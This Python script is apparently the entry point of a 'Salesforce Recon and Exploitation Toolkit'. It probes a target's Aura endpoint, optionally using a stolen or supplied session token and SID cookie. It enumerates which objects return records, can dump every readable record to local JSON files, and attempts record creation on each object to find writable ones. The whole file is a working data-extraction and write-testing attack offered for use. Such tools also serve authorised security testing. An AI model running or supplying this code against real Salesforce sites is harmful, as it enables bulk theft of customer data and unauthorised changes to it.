from log import log_message
from sf import SFExploit
from datetime import date
import time
import argparse
import os
import json

DEFAULT_DUMP_OUTPUT_DIRECTORY_PREFIX="output"
SALESFORCE_AURA_STANDARD_OBJECTS_LIST_FILENAME="salesforce_aura_standard_objects_list.txt"

def salesforce_tester(dump_records:bool, dump_output_dir: str, url:str, uri:str, token:str, sid:str, fwuid:str, app_data:str):
	log_message(f"> Testing: {url}")
	vulnerability = {'accessible_objects':[],
					'writable_objects':[]}
	got_objects = list()
	tester = SFExploit(url, uri, token, sid, fwuid, app_data)
	if tester.invalid:
		return {'vulnerable':False}
	
	available_custom_objects = tester.get_custom_objects()
	with open(SALESFORCE_AURA_STANDARD_OBJECTS_LIST_FILENAME) as f: 
		available_standard_objects = f.read().split()
	available_objects = sorted(list(set(available_custom_objects + available_standard_objects)))

	if (available_objects is not None):
		# test object access
		log_message(f">> Testing objects.")

		# Prepare dump directory
		if (dump_records):
			
			if (dump_output_dir is not None and len(dump_output_dir) > 0):
				output_directory = dump_output_dir;
			else:
				timestamp = str(int(time.time()))
				output_directory = DEFAULT_DUMP_OUTPUT_DIRECTORY_PREFIX+"_"+timestamp	

			os.makedirs(output_directory, exist_ok=True)
		
		for object_name in available_objects:
			object_data = tester.get_object_items(object_name)
			 # something was returned:
			if object_data:
				log_message(f">>> Found {object_name} to be accessible.")
				object_data_metric = {object_name:{'total_count':object_data['totalCount']}}
				vulnerability['accessible_objects'].append(object_data_metric)

				# Try to dump all records for this object name
				if(dump_records):
					object_dump_directory = output_directory+"/"+object_name
					os.makedirs(object_dump_directory, exist_ok=True)
					for data in object_data["result"]:
						record = data["record"]
						# Try to dump the record object
						record_id = record["Id"]
						with open(object_dump_directory + "/" + record_id +".json", 'w') as record_file:
							json.dump(record, record_file)

				got_objects.append(object_name)

		# test write
		log_message(f">> Testing write to objects")
		for object_name in available_objects:
			write_allowed  = tester.attempt_record_create(object_name)
			if write_allowed:
				log_message(f">>> Found {object_name} to be potentially vulnerable.")
				vulnerability['writable_objects'].append(object_name)
	else:
		log_message(f">> No available objects.")
	
	if len(vulnerability['accessible_objects']) > 0 or len(vulnerability['writable_objects']) > 0:
		log_message(f">> Concluding testing for {url}. {url} is vulnerable.")
		final_return = {'vulnerable':True, 'data':vulnerability}
		return final_return
	else:
		log_message(f">> Concluding testing for {url}. {url} is not vulnerable")
		return {'vulnerable':False}

def main():
	parser = argparse.ArgumentParser(description="SRET - Salesforce Recon and Exploitation Toolkit")
	parser.add_argument('url', nargs='?')
	parser.add_argument('-t', '--token', type=str, required=False, dest='token', help = "AURA token (Authenticated user)")
	parser.add_argument('-s', '--sid', type=str, required=False, dest='sid', help = "SID cookie (Authenticated user)")
	parser.add_argument('-u', '--uri', type=str, required=False, dest='uri', help = "Force specific AURA endpoint URI")
	parser.add_argument('-f', '--fwuid', type=str, required=False, dest='fwuid', help = "Force specific FWUID (default: wrongfwuid))")
	parser.add_argument('-a', '--app', type=str, required=False, dest='app_data', help = "Force app (default: siteforce:loginApp2)")
	parser.add_argument('-d', '--dump-records', action='store_true', dest='dump_records', help = "Dump all readable objects (Default: <OUTPUT_DIRECTORY>/<OBJECT>/<RECORD_ID>.json).")
	parser.add_argument('-o', '--dump-output', type=str, required=False, dest='dump_output', help = "Dump output directory (Default: ./output_<TIMESTAMP>).")
	args = parser.parse_args()
	
	today = date.today()
	formatted_date = today.strftime("%m/%d/%Y")
	log_message(f"Scan date: {formatted_date}")
	vulnerable_or_not = salesforce_tester(	args.dump_records, 
											args.dump_output, 
									   		args.url, 
											args.uri, 
											args.token, 
											args.sid, 
											args.fwuid, 
											args.app_data)
	print(vulnerable_or_not)

main()